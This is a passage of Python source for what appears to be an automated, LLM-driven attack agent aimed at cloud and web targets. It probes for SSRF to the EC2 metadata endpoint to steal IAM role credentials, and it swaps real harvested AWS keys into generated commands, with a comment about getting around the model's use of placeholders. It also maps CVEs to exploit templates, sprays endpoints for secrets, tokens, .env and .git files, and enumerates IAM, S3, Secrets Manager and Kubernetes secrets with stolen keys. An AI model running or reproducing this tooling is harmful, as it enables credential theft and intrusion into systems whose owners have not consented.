            self.state["execution_history"] = self.state["execution_history"][-5:]

    def _summarize_credential_output(self, text: str) -> Optional[str]:
        """If text contains AWS credential JSON, extract just the key values as compact summary."""
        try:
            # Try to parse as JSON
            data = json.loads(text)
            if isinstance(data, dict):
                summary_parts = []
                for key in ["AccessKeyId", "SecretAccessKey", "Token", "SessionToken"]:
                    if key in data:
                        val = data[key]
                        summary_parts.append(f"{key}={val}")
                if summary_parts:
                    return "CREDENTIALS:\n" + "\n".join(summary_parts)
        except (json.JSONDecodeError, TypeError):
            pass
        # Try regex extraction for non-JSON credential output
        ak = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', text)
        sk = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', text)
        st = re.search(r'"(?:Token|SessionToken)"\s*:\s*"([^"]+)"', text)
        if ak and sk:
            parts = [f"AccessKeyId={ak.group(1)}", f"SecretAccessKey={sk.group(1)}"]
            if st:
                parts.append(f"SessionToken={st.group(1)}")
            return "CREDENTIALS:\n" + "\n".join(parts)
        return None

    def _inject_real_credentials(
        self,
        command: str,
        state_snapshot: Optional[Dict[str, Any]] = None,
    ) -> str:
        """Replace placeholder/example credentials in commands with REAL extracted credentials.
        This bypasses the LLM's tendency to use AKIAIOSFODNN7EXAMPLE or <SECRET>.
        """
        creds = (state_snapshot or self.state).get("credentials_found", {})
        if not creds:
            return command

        real_key = creds.get("AWS_ACCESS_KEY_ID", "")
        real_secret = creds.get("AWS_SECRET_ACCESS_KEY", "")
        real_token = creds.get("AWS_SESSION_TOKEN", "")

        if not real_key or not real_secret:
            return command

        original = command

        # Replace known placeholder patterns for access key
        placeholder_keys = [
            "AKIAIOSFODNN7EXAMPLE", "REAL_KEY", "REAL_ACCESS_KEY_ID",
            "EXAMPLE_KEY", "<ACCESS_KEY>", "<AWS_ACCESS_KEY_ID>",
        ]
        for pk in placeholder_keys:
            command = command.replace(pk, real_key)

        # Replace known placeholder patterns for secret key
        placeholder_secrets = [
            "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "REAL_SECRET", "REAL_SECRET_KEY", "<SECRET>",
            "<AWS_SECRET_ACCESS_KEY>", "EXAMPLE_SECRET",
        ]
        for ps in placeholder_secrets:
            command = command.replace(ps, real_secret)

        # Replace placeholder session tokens
        placeholder_tokens = [
            "REAL_TOKEN", "REAL_SESSION_TOKEN", "<SESSION_TOKEN>",
            "<AWS_SESSION_TOKEN>",
        ]
        for pt in placeholder_tokens:
            command = command.replace(pt, real_token if real_token else "")

        if command != original:
            logger.info(f"     🔧 Injected real credentials into command")

        return command

    def _fix_region(
        self,
        command: str,
        state_snapshot: Optional[Dict[str, Any]] = None,
    ) -> str:
        """Fix wrong S3 region in commands using discovered region from state."""
        discovered_region = (state_snapshot or self.state).get("target_info", {}).get(
            "aws_region",
            "us-east-1",
        )
        if "s3" in command.lower():
            for wrong_region in ["eu-central-1", "eu-west-1", "ap-southeast-1", "us-west-2"]:
                if wrong_region in command and wrong_region != discovered_region:
                    command = command.replace(wrong_region, discovered_region)
                    logger.info(f"     🔧 Fixed region: {wrong_region} → {discovered_region}")
        return command

    def _detect_critical_output(self, result: Dict) -> Dict[str, str]:
        """
        Detect critical values in command output that should trigger
        re-generation of follow-up commands.
        Returns dict of {pattern_name: extracted_value}.
        """
        combined = result.get("stdout", "") + "\n" + result.get("stderr", "")
        found = {}
        for name, pattern in self.CRITICAL_OUTPUT_PATTERNS.items():
            match = pattern.search(combined)
            if match:
                found[name] = match.group(1)
        return found

    @staticmethod
    def _is_valid_imds_response(stdout: str, expected: str = "token") -> bool:
        """Validate IMDS response format. Rejects HTML, error pages, empty."""
        text = stdout.strip()
        if not text or len(text) < 4:
            return False
        if "<html" in text.lower() or "<head" in text.lower() or "<!doctype" in text.lower():
            return False
        if "Method Not Allowed" in text or "AccessDenied" in text or "Error" in text[:20]:
            return False
        if expected == "token":
            if len(text) > 1000 or "\n" in text.strip():
                return False
            if text.startswith("{") or text.startswith("["):
                return False
        elif expected == "role":
            if len(text) > 200 or "/" in text or " " in text.strip():
                return False
            if not re.match(r'^[A-Za-z0-9_.-]+$', text):
                return False
        elif expected == "credentials":
            try:
                data = json.loads(text)
                return bool(data.get("AccessKeyId") and data.get("SecretAccessKey"))
            except (json.JSONDecodeError, TypeError, AttributeError):
                return False
        return True

    def _probe_ssrf_endpoint(self, target_url: str) -> Optional[str]:
        """Probe target for SSRF-capable endpoints. Returns working SSRF base URL or None."""
        candidate_paths = []
        endpoints = self.state.get("web_endpoints", [])
        for ep in endpoints:
            ep_lower = ep.lower()
            if any(kw in ep_lower for kw in ["proxy", "fetch", "url", "redirect", "ssrf", "request", "forward"]):
                candidate_paths.append(ep.rstrip("/"))

        if "/proxy" not in [p.lower() for p in candidate_paths]:
            candidate_paths.append("/proxy")

        imds_v1_canary = "http://169.254.169.254/latest/meta-data/"
        imds_v2_token_url = "http://169.254.169.254/latest/api/token"

        imds_v1_keywords = ["ami-id", "instance-id", "security-credentials",
                            "iam", "placement", "hostname", "local-ipv4"]
        imds_deny_keywords = ["401", "unauthorized", "token required", "forbidden"]

        for path in candidate_paths:
            url_fmts = [
                (f"{target_url}{path}?url=", "?url="),
                (f"{target_url}{path}?target=", "?target="),
            ]
            for base, param_style in url_fmts:
                # 1) Try IMDSv1 GET — works if IMDSv1 is enabled
                probe_cmd = f"curl -s -k -m 5 {shlex.quote(base + imds_v1_canary)}"
                try:
                    probe = self.executor.run(probe_cmd)
                    out = probe.get("stdout", "").strip()
                    if out:
                        out_lower = out.lower()
                        if any(kw in out for kw in imds_v1_keywords):
                            logger.info(f"     ✅ SSRF probe hit: {path} proxies to IMDS (v1)")
                            return base
                        if any(kw in out_lower for kw in imds_deny_keywords):
                            put_cmd = (
                                f"curl -s -k -m 5 -X PUT "
                                f"-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
                                f"{shlex.quote(base + imds_v2_token_url)}"
                            )
                            put_r = self.executor.run(put_cmd)
                            put_out = put_r.get("stdout", "").strip()
                            if put_out and self._is_valid_imds_response(put_out, "token"):
                                logger.info(f"     ✅ SSRF probe hit: {path} proxies to IMDS (v2 token obtained)")
                                return base
                            logger.info(f"     ✅ SSRF probe hit: {path} reaches IMDS (got {out[:40]})")
                            return base
                except (ConnectionError, TimeoutError, OSError) as e:
                    logger.debug(f"SSRF probe failed for {path}: {e}")
                    continue
                except Exception as e:
                    logger.warning(f"Unexpected error probing {path}: {type(e).__name__}")
                    continue
        return None

    _VALID_AWS_REGION_RE = re.compile(
        r"^(us|eu|ap|sa|ca|me|af)-(east|west|central|south|north|northeast|southeast|southwest|northwest)-\d$"
    )

    @staticmethod
    def _sanitize_artifact(value: str, max_len: int = 200) -> str:
        """Sanitize an extracted artifact for safe shell interpolation."""
        value = value.strip()[:max_len]
        return shlex.quote(value)

    @classmethod
    def _validate_region(cls, region: str) -> str:
        """Return region if valid AWS region, else default."""
        if cls._VALID_AWS_REGION_RE.match(region):
            return region
        return "us-east-1"

    _KNOWN_TLDS = {"com", "net", "org", "io", "cloud", "dev", "app", "co", "edu", "gov"}

    @staticmethod
    def _s3_bucket_candidates(hostname: str) -> List[str]:
        """Return deduplicated S3 bucket name candidates from a hostname.

        For "level2.flaws.cloud" → ["flaws.cloud"] (parent domain)
        For "flaws.cloud" → ["flaws.cloud"]
        For "my-bucket" → ["my-bucket"]
        Skips hostnames that are clearly not S3 buckets (IPs, localhost).
        """
        h = hostname.strip().lower().rstrip(".")
        if not h or h == "localhost" or re.match(r"^\d+\.\d+\.\d+\.\d+$", h):
            return []

        parts = h.split(".")
        candidates = []

        if len(parts) <= 2:
            candidates.append(h)
        else:
            parent = ".".join(parts[-2:])
            candidates.append(parent)
            if parent != h:
                candidates.append(h)

        return candidates

    def _load_cve_templates(self) -> Dict:
        if hasattr(self, "_cve_templates_cache"):
            return self._cve_templates_cache
        templates_path = os.path.join(os.path.dirname(__file__), "cve_exploit_templates.json")
        try:
            with open(templates_path) as f:
                self._cve_templates_cache = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self._cve_templates_cache = {}
        return self._cve_templates_cache

    CVE_TO_SERVICE = {
        "CVE-2022-22947": "spring-actuator-unauth",
        "CVE-2022-22963": "spring-actuator-unauth",
        "CVE-2022-22965": "spring-actuator-unauth",
        "CVE-2021-43798": "grafana-unauth",
        "CVE-2024-23897": "jenkins-unauth",
        "CVE-2022-26134": "jenkins-unauth",
        "CVE-2023-22515": "jenkins-unauth",
        "CVE-2023-22527": "jenkins-unauth",
        "CVE-2023-28432": "minio-unauth",
        "CVE-2022-0543": "redis-unauth",
        "CVE-2015-1427": "elasticsearch-unauth",
        "CVE-2021-44228": "spring-actuator-unauth",
        "CVE-2024-27198": "jenkins-unauth",
        "CVE-2023-42793": "jenkins-unauth",
    }

    def _get_cve_commands(self, task: Dict, target_url: str) -> List[str]:
        templates = self._load_cve_templates()
        if not templates or not target_url:
            return []
        task_text = (task.get("name", "") + " " + task.get("instruction", "")).lower()
        cve_id = task.get("cve_id", "")

        if not cve_id:
            import re as _re
            m = _re.search(r"cve-\d{4}-\d+", task_text, _re.IGNORECASE)
            if m:
                cve_id = m.group().upper()

        tmpl = None
        if cve_id:
            tmpl = templates.get(cve_id)
            if not tmpl:
                svc = self.CVE_TO_SERVICE.get(cve_id, "")
                if svc:
                    tmpl = templates.get(svc)

        if not tmpl:
            for t_id in templates:
                if t_id.startswith("_"):
                    continue
                if t_id.lower() in task_text:
                    tmpl = templates[t_id]
                    break

        if not tmpl:
            return []

        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        host = parsed.hostname or "localhost"
        port = str(parsed.port or 80)
        cmds = []
        for c in tmpl.get("commands", []):
            c = c.replace("{TARGET}", target_url).replace("{HOST}", host).replace("{PORT}", port)
            cmds.append(c)
        for c in tmpl.get("verify_commands", []):
            c = c.replace("{TARGET}", target_url).replace("{HOST}", host).replace("{PORT}", port)
            cmds.append(c)
        return cmds

    def _get_fallback_commands(self, task: Dict, state: Dict) -> List[str]:
        """Generate fallback commands based on task keywords when Generator returns empty."""
        task_text = (task.get("name", "") + " " + task.get("instruction", "")).lower()
        phase = task.get("phase", "recon")
        target_url = state.get("target_url", "")
        creds = state.get("credentials_found", {})

        cve_cmds = self._get_cve_commands(task, target_url)
        if cve_cmds:
            return cve_cmds

        # Dynamic region from discovered artifacts
        regions = state.get("cloud_artifacts", {}).get("regions", [])
        region = regions[0] if regions else state.get("target_info", {}).get("aws_region", "us-east-1")

        cred_prefix = ""
        if creds.get("AWS_ACCESS_KEY_ID") and creds.get("AWS_SECRET_ACCESS_KEY"):
            ak = shlex.quote(creds["AWS_ACCESS_KEY_ID"])
            sk = shlex.quote(creds["AWS_SECRET_ACCESS_KEY"])
            cred_prefix = f"export AWS_ACCESS_KEY_ID={ak} && export AWS_SECRET_ACCESS_KEY={sk}"
            st = creds.get("AWS_SESSION_TOKEN", "")
            if st:
                cred_prefix += f" && export AWS_SESSION_TOKEN={shlex.quote(st)}"

        commands: List[str] = []

        # ── Web exploit / security assessment fallback (check FIRST) ──
        if target_url and any(kw in task_text for kw in [
            "exploit", "pentest", "attack", "path traversal",
            "rce", "injection", "bypass", "file read", "upload",
            "cve", "vulnerability", "web", "bootstrap", "assess",
            "scan", "enum", "discover", "credential", "secret",
            "config", "audit", "probe", "test", "check",
        ]):
            from urllib.parse import urlparse
            parsed = urlparse(target_url)

            # ── Phase 1: Service fingerprint + environment/config disclosure ──
            commands.extend([
                f"curl -s -k -D- '{target_url}/' 2>/dev/null | head -80",
                f"curl -s -k '{target_url}/env' 2>/dev/null",
                f"curl -s -k '{target_url}/config' 2>/dev/null",
                f"curl -s -k '{target_url}/.env' 2>/dev/null",
            ])

            # ── Phase 2: Universal API endpoint discovery ──
            commands.extend([
                f"curl -s -k '{target_url}/api' 2>/dev/null",
                f"curl -s -k '{target_url}/api/json' 2>/dev/null",
                f"curl -s -k '{target_url}/api/v1' 2>/dev/null",
                f"curl -s -k '{target_url}/api/v2' 2>/dev/null",
                f"curl -s -k '{target_url}/health' 2>/dev/null",
                f"curl -s -k '{target_url}/healthz' 2>/dev/null",
            ])

            # ── Phase 3: Credential/secret/key endpoint probing ──
            commands.extend([
                f"curl -s -k '{target_url}/api/credentials' 2>/dev/null",
                f"curl -s -k '{target_url}/api/secrets' 2>/dev/null",
                f"curl -s -k '{target_url}/api/keys' 2>/dev/null",
                f"curl -s -k '{target_url}/api/tokens' 2>/dev/null",
                f"curl -s -k '{target_url}/api/config' 2>/dev/null",
                f"curl -s -k '{target_url}/api/settings' 2>/dev/null",
                f"curl -s -k '{target_url}/credentials' 2>/dev/null",
                f"curl -s -k '{target_url}/secrets' 2>/dev/null",
            ])

            # ── Phase 4: Jenkins-style endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/script' 2>/dev/null",
                f"curl -s -k '{target_url}/manage' 2>/dev/null",
                f"curl -s -k '{target_url}/credentials/store/system/domain/_/api/json' 2>/dev/null",
                f"curl -s -k '{target_url}/systemInfo' 2>/dev/null",
            ])

            # ── Phase 5: Spring/Actuator endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/actuator' 2>/dev/null",
                f"curl -s -k '{target_url}/actuator/env' 2>/dev/null",
                f"curl -s -k '{target_url}/actuator/configprops' 2>/dev/null",
                f"curl -s -k '{target_url}/actuator/mappings' 2>/dev/null",
                f"curl -s -k '{target_url}/actuator/beans' 2>/dev/null",
            ])

            # ── Phase 6: Azure-style API endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/api/admin/config' 2>/dev/null",
                f"curl -s -k '{target_url}/api/admin/users' 2>/dev/null",
                f"curl -s -k '{target_url}/api/admin/keys' 2>/dev/null",
                f"curl -s -k '{target_url}/api/admin/secrets' 2>/dev/null",
                f"curl -s -k '{target_url}/api/functions' 2>/dev/null",
                f"curl -s -k '{target_url}/api/host/keys' 2>/dev/null",
                f"curl -s -k '{target_url}/api/deploymentcredentials' 2>/dev/null",
                f"curl -s -k '{target_url}/api/workspace/tokens' 2>/dev/null",
                f"curl -s -k '{target_url}/api/workspace/keys' 2>/dev/null",
                f"curl -s -k '{target_url}/api/workspace/connections' 2>/dev/null",
            ])

            # ── Phase 7: Azure DevOps / _apis endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/_apis' 2>/dev/null",
                f"curl -s -k '{target_url}/_apis/projects' 2>/dev/null",
                f"curl -s -k '{target_url}/_apis/tokens/pats' 2>/dev/null",
                f"curl -s -k '{target_url}/_apis/serviceendpoint/endpoints' 2>/dev/null",
                f"curl -s -k '{target_url}/_apis/distributedtask/variablegroups' 2>/dev/null",
                f"curl -s -k '{target_url}/_apis/connectionData' 2>/dev/null",
            ])

            # ── Phase 8: K8s/OpenShift-style endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/api/v1/namespaces' 2>/dev/null",
                f"curl -s -k '{target_url}/api/v1/namespaces/default/secrets' 2>/dev/null",
                f"curl -s -k '{target_url}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings' 2>/dev/null",
            ])

            # ── Phase 9: AWS-style endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/api/auth/config' 2>/dev/null",
                f"curl -s -k '{target_url}/api/auth/tokens' 2>/dev/null",
                f"curl -s -k '{target_url}/api/auth/credentials' 2>/dev/null",
                f"curl -s -k '{target_url}/api/iam/roles' 2>/dev/null",
                f"curl -s -k '{target_url}/api/stacks' 2>/dev/null",
                f"curl -s -k '{target_url}/api/projects' 2>/dev/null",
            ])

            # ── Phase 10: Container/Registry endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/v2/_catalog' 2>/dev/null",
                f"curl -s -k '{target_url}/api/registries' 2>/dev/null",
            ])

            # ── Phase 11: Storage/blob/key endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/api/storage/accounts' 2>/dev/null",
                f"curl -s -k '{target_url}/api/accounts' 2>/dev/null",
                f"curl -s -k '{target_url}/api/containers' 2>/dev/null",
                f"curl -s -k '{target_url}/api/datastores' 2>/dev/null",
            ])

            # ── Phase 12: SSRF/proxy testing ──
            commands.extend([
                f"curl -s -k '{target_url}/proxy?url=http://169.254.169.254/latest/meta-data/' 2>/dev/null",
                f"curl -s -k '{target_url}/fetch?url=http://169.254.169.254/latest/meta-data/' 2>/dev/null",
            ])

            # ── Phase 13: Misc security-sensitive endpoints ──
            commands.extend([
                f"curl -s -k '{target_url}/api/compute' 2>/dev/null",
                f"curl -s -k '{target_url}/api/devices' 2>/dev/null",
                f"curl -s -k '{target_url}/api/clusters' 2>/dev/null",
                f"curl -s -k '{target_url}/api/instances' 2>/dev/null",
                f"curl -s -k '{target_url}/api/databases' 2>/dev/null",
                f"curl -s -k '{target_url}/api/pipelines' 2>/dev/null",
                f"curl -s -k '{target_url}/api/connections' 2>/dev/null",
                f"curl -s -k '{target_url}/api/workspaces' 2>/dev/null",
                f"curl -s -k '{target_url}/wp-json/wp/v2/users' 2>/dev/null",
                f"curl -s -k '{target_url}/wp-config.php.bak' 2>/dev/null",
                f"curl -s -k '{target_url}/api/agent/config' 2>/dev/null",
                f"curl -s -k '{target_url}/api/extensions' 2>/dev/null",
                f"curl -s -k '{target_url}/api/firewalls' 2>/dev/null",
                f"curl -s -k '{target_url}/metadata/instance' 2>/dev/null",
            ])

        elif any(kw in task_text for kw in ["cognito", "identity pool", "identity-pool"]):
            known_pools = state.get("cloud_artifacts", {}).get("cognito_pool_ids", [])
            if known_pools:
                raw_pool = known_pools[0]
                safe_pool = self._sanitize_artifact(raw_pool)
                region = self._validate_region(raw_pool.split(":")[0] if ":" in raw_pool else "")
                commands.extend([
                    f"aws cognito-identity get-id --identity-pool-id {safe_pool} --region {region} --no-sign-request 2>&1",
                    f"aws cognito-identity get-open-id-token --identity-id $(aws cognito-identity get-id --identity-pool-id {safe_pool} --region {region} --no-sign-request --query 'IdentityId' --output text 2>/dev/null) --region {region} --no-sign-request 2>&1",
                    f"aws cognito-identity get-credentials-for-identity --identity-id $(aws cognito-identity get-id --identity-pool-id {safe_pool} --region {region} --no-sign-request --query 'IdentityId' --output text 2>/dev/null) --region {region} --no-sign-request 2>&1",
                ])
            if cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws cognito-identity list-identity-pools --max-results 20 --region {region}",
                    f"{cred_prefix} && aws cognito-idp list-user-pools --max-results 20 --region {region}",
                ])
            if not known_pools and target_url:
                commands.append(f"curl -s -k '{target_url}' | grep -oE '(us-east|us-west|eu-west|ap-southeast)-[0-9]:[0-9a-f-]{{36}}'")

        elif (re.search(r"\becr\b", task_text) or any(kw in task_text for kw in ["docker", "container image", "container registry"])):
            known_repos = state.get("cloud_artifacts", {}).get("ecr_repos", [])
            if known_repos and cred_prefix:
                ecr = known_repos[0]
                region_match = re.search(r"ecr\.([a-z0-9-]+)\.amazonaws", ecr)
                ecr_region = self._validate_region(region_match.group(1) if region_match else "")
                parts = ecr.split("/")
                registry = parts[0] if len(parts) >= 2 else ""
                repo_name = (parts[-1].split(":")[0] if len(parts) >= 2 else "").strip()
                if registry and repo_name:
                    safe_registry = self._sanitize_artifact(registry)
                    safe_repo = self._sanitize_artifact(repo_name)
                    commands.extend([
                        f"{cred_prefix} && aws ecr get-login-password --region {ecr_region} | docker login --username AWS --password-stdin {safe_registry} 2>&1",
                        f"{cred_prefix} && aws ecr list-images --repository-name {safe_repo} --region {ecr_region} --output json | head -50",
                        f"{cred_prefix} && aws ecr describe-images --repository-name {safe_repo} --region {ecr_region} --output json | head -100",
                    ])
            elif cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws ecr describe-repositories --region {region} --output json | head -50",
                ])

        elif any(kw in task_text for kw in ["lambda", "function", "invoke"]):
            if cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws lambda list-functions --region {region} --output json",
                ])

        elif any(kw in task_text for kw in ["ecs", "fargate", "container", "task definition"]):
            if cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws ecs list-clusters --region {region}",
                    f"{cred_prefix} && aws ecs list-task-definitions --region {region} --max-items 20",
                    f"{cred_prefix} && aws ecs describe-task-definition --task-definition $(aws ecs list-task-definitions --region {region} --query 'taskDefinitionArns[0]' --output text 2>/dev/null) --region {region} 2>&1 | head -100",
                ])

        elif any(kw in task_text for kw in ["iam", "role", "policy", "permission"]):
            if cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws iam get-user 2>/dev/null || aws sts get-caller-identity",
                    f"{cred_prefix} && aws iam list-roles --max-items 50 --output json",
                    f"{cred_prefix} && aws iam list-attached-role-policies --role-name $(aws iam list-roles --query 'Roles[0].RoleName' --output text) 2>/dev/null",
                ])

        elif any(kw in task_text for kw in ["secret", "ssm", "parameter"]):
            if cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws secretsmanager list-secrets --region {region} --max-results 20",
                    f"{cred_prefix} && aws ssm describe-parameters --region {region} --max-results 20",
                ])

        elif any(kw in task_text for kw in ["s3", "bucket", "storage"]):
            known_buckets = state.get("cloud_artifacts", {}).get("s3_buckets", [])
            for bucket in known_buckets[:3]:
                sb = self._sanitize_artifact(bucket)
                commands.append(f"aws s3 ls s3://{sb}/ --no-sign-request 2>&1 | head -30")
                commands.append(f"aws s3 ls s3://{sb}/ --no-sign-request --recursive 2>&1 | head -50")
            if cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws s3 ls",
                    f"{cred_prefix} && aws s3api list-buckets --output json",
                ])
                for bucket in known_buckets[:2]:
                    sb = self._sanitize_artifact(bucket)
                    commands.append(f"{cred_prefix} && aws s3 ls s3://{sb}/ --recursive | head -50")

        elif any(kw in task_text for kw in ["ssrf", "metadata", "imds", "169.254", "proxy"]):
            if target_url:
                commands.extend([
                    f"curl -s -k -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' '{target_url}/proxy?url=http://169.254.169.254/latest/api/token'",
                    f"curl -s -k '{target_url}/proxy?url=http://169.254.169.254/latest/meta-data/'",
                    f"curl -s -k '{target_url}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                ])

        elif any(kw in task_text for kw in ["recon", "discover", "enumerate endpoint", "web"]):
            if target_url:
                commands.extend([
                    f"curl -s -k -D- '{target_url}/' | head -200",
                    f"curl -s -k '{target_url}/' | grep -oiE '(href|src|action)=\"[^\"]+\"' | head -30",
                    f"curl -s -k '{target_url}/' | grep -oiE 'https?://[^\"\\s<>]+' | sort -u | head -20",
                    f"curl -s -k '{target_url}/' | grep -oiE '(us-east|us-west|eu-west|ap-southeast)-[0-9]:[0-9a-f-]{{36}}' | head -5",
                    f"curl -s -k '{target_url}/' | grep -oiE '(AKIA|ASIA)[A-Z0-9]{{16}}' | head -5",
                    f"curl -s -k '{target_url}/' | grep -oiE 'src=\"([^\"]*\\.js(\\?[^\"]*)?)\"' | sed 's/src=\"//;s/\"//' | head -10",
                    f"curl -s -k '{target_url}/' | grep -oiE '[a-z0-9-]+\\.s3[.-][a-z0-9.-]*\\.amazonaws\\.com' | head -5",
                ])
                for ep in ["/robots.txt", "/.git/HEAD", "/.env", "/actuator/env",
                           "/api", "/.well-known/security.txt", "/sitemap.xml",
                           "/swagger-ui.html", "/v2/api-docs", "/graphql"]:
                    commands.append(
                        f"curl -s -k -o /dev/null -w '%{{http_code}} {ep}\\n' '{target_url}{ep}'"
                    )
                from urllib.parse import urlparse
                host = urlparse(target_url).hostname or ""
                if host:
                    host_prefix = re.escape(host.split(".")[0])
                    commands.append(
                        f"curl -s -k '{target_url}/' | grep -oiE 'https?://[a-z0-9.-]*{host_prefix}[^\"\\s<>]*' | sort -u | head -10"
                    )

        elif any(kw in task_text for kw in ["git", "source code", "version control", "repository"]):
            if target_url:
                commands.extend([
                    f"curl -s -k '{target_url}/.git/HEAD'",
                    f"curl -s -k '{target_url}/.git/config'",
                    f"curl -s -k '{target_url}/.git/logs/HEAD' | head -50",
                ])

        elif any(kw in task_text for kw in ["cloudtrail", "trail", "log", "audit"]):
            if cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws cloudtrail describe-trails --region {region} --output json",
                    f"{cred_prefix} && aws cloudtrail lookup-events --region {region} --max-results 20 --output json | head -200",
                    f"{cred_prefix} && aws s3 ls 2>&1 | grep -i trail",
                ])

        elif any(kw in task_text for kw in ["dns", "subdomain", "nslookup"]):
            from urllib.parse import urlparse
            host = (urlparse(target_url).hostname or "").strip()
            if host and re.match(r"^[a-z0-9.-]+$", host, re.IGNORECASE):
                safe_host = shlex.quote(host)
                commands.extend([
                    f"dig +short {safe_host} ANY",
                    f"nslookup {safe_host}",
                    f"curl -s -k 'https://crt.sh/?q=%25.{host}&output=json' | python3 -c \"import sys,json;[print(e['name_value']) for e in json.load(sys.stdin)[:20]]\" 2>/dev/null || echo 'crt.sh unavailable'",
                ])

        artifacts = state.get("cloud_artifacts", {})
        if not commands and artifacts.get("cognito_pool_ids"):
            raw_pool = artifacts["cognito_pool_ids"][0]
            safe_pool = self._sanitize_artifact(raw_pool)
            region = self._validate_region(raw_pool.split(":")[0] if ":" in raw_pool else "")
            commands.extend([
                f"aws cognito-identity get-id --identity-pool-id {safe_pool} --region {region} --no-sign-request 2>&1 || echo 'needs auth'",
            ])
            if cred_prefix:
                commands.append(
                    f"{cred_prefix} && aws cognito-identity get-id --identity-pool-id {safe_pool} --region {region}"
                )

        if not commands and artifacts.get("ecr_repos"):
            ecr = artifacts["ecr_repos"][0]
            if cred_prefix:
                region_match = re.search(r"ecr\.([a-z0-9-]+)\.amazonaws", ecr)
                ecr_region = self._validate_region(region_match.group(1) if region_match else "")
                parts = ecr.split("/")
                if len(parts) >= 2:
                    safe_registry = self._sanitize_artifact(parts[0])
                    safe_repo = self._sanitize_artifact(parts[-1].split(":")[0])
                    commands.extend([
                        f"{cred_prefix} && aws ecr get-login-password --region {ecr_region} | docker login --username AWS --password-stdin {safe_registry} 2>&1",
                        f"{cred_prefix} && aws ecr list-images --repository-name {safe_repo} --region {ecr_region} 2>&1 | head -50",
                    ])

        # ── Azure-specific fallback templates ──
        if not commands and any(kw in task_text for kw in ["azure", "blob", "keyvault", "entra", "app service"]):
            if any(kw in task_text for kw in ["blob", "storage"]):
                commands.extend([
                    "az storage account list --output table 2>&1 | head -30",
                    "az storage container list --account-name STORAGE_ACCOUNT --output table 2>&1 | head -30",
                ])
            elif any(kw in task_text for kw in ["keyvault", "key vault", "secret"]):
                commands.extend([
                    "az keyvault list --output table 2>&1 | head -20",
                    "az keyvault secret list --vault-name VAULT_NAME --output table 2>&1 | head -20",
                ])
            elif any(kw in task_text for kw in ["entra", "active directory", "aad"]):
                commands.extend([
                    "az ad user list --output table 2>&1 | head -30",
                    "az ad app list --output table 2>&1 | head -30",
                    "az role assignment list --output table 2>&1 | head -30",
                ])
            else:
                commands.extend([
                    "az account show 2>&1",
                    "az resource list --output table 2>&1 | head -30",
                    "az webapp list --output table 2>&1 | head -20",
                ])

        # ── GCP-specific fallback templates ──
        if not commands and any(kw in task_text for kw in ["gcp", "gcloud", "gsutil", "gcs", "bigquery", "gke"]):
            if any(kw in task_text for kw in ["gcs", "gsutil", "bucket", "storage"]):
                commands.extend([
                    "gsutil ls 2>&1 | head -30",
                    "gcloud storage buckets list --format=table 2>&1 | head -30",
                ])
            elif any(kw in task_text for kw in ["iam", "role", "permission"]):
                commands.extend([
                    "gcloud iam roles list --format=table 2>&1 | head -30",
                    "gcloud projects get-iam-policy $(gcloud config get-value project 2>/dev/null) --format=table 2>&1 | head -50",
                ])
            elif any(kw in task_text for kw in ["compute", "instance", "vm"]):
                commands.extend([
                    "gcloud compute instances list --format=table 2>&1 | head -30",
                ])
            else:
                commands.extend([
                    "gcloud auth list 2>&1",
                    "gcloud projects list --format=table 2>&1 | head -20",
                    "gcloud services list --enabled --format=table 2>&1 | head -30",
                ])

        # ── Generic fallback ──
        if not commands:
            if cred_prefix:
                commands.extend([
                    f"{cred_prefix} && aws sts get-caller-identity",
                    f"{cred_prefix} && aws s3 ls",
                    f"{cred_prefix} && aws lambda list-functions --region {region} 2>/dev/null || echo 'no lambda access'",
                    f"{cred_prefix} && aws iam get-user 2>/dev/null || echo 'no iam access'",
                ])
            elif target_url:
                commands.extend([
                    f"curl -s -k -D- '{target_url}/' | head -100",
                    f"curl -s -k '{target_url}/' | grep -oiE '(us-east-1:[a-f0-9-]{{36}}|AKIA[A-Z0-9]{{16}}|s3://[a-z0-9.-]+|[a-z0-9-]+\\.s3[.-][a-z0-9.-]*\\.amazonaws\\.com|[a-z0-9]+\\.execute-api\\.[a-z0-9-]+\\.amazonaws\\.com)'",
                    f"curl -s -k '{target_url}/' | grep -oiE 'src=\"[^\"]*\\.js[^\"]*\"' | sed 's/src=\"//;s/\"//' | head -10",
                    f"curl -s -k '{target_url}/.git/HEAD' 2>/dev/null | head -5",
                ])

        return commands[:10]

    def _auto_follow_urls(self, task_name: str, task_phase: str, round_num: int,
                          task_results: List[Dict[str, Any]], max_follows: int = 4) -> List[Dict[str, Any]]:
        """Auto-fetch discovered URLs (JS files, level pages, API endpoints) and parse their output."""
        urls_to_follow = self.state.get("urls_to_follow", [])
        if not urls_to_follow:
            return task_results

        followed = 0
        while urls_to_follow and followed < max_follows:
            url = urls_to_follow.pop(0)
            if not url.startswith("http"):
                continue
            safe_url = shlex.quote(url)
            cmd = f"curl -s -k -L {safe_url} | head -500"
            if self._normalize_cmd(cmd) in self._executed_commands:
                continue
            logger.info(f"     🔗 AUTO-FOLLOW: {url[:80]}")
            result = self.executor.run(cmd)
            result["task"] = task_name
            result["phase"] = task_phase
            result["round"] = round_num
            result["timestamp"] = datetime.now().isoformat()
            self.execution_log.append(result)
            task_results.append(result)
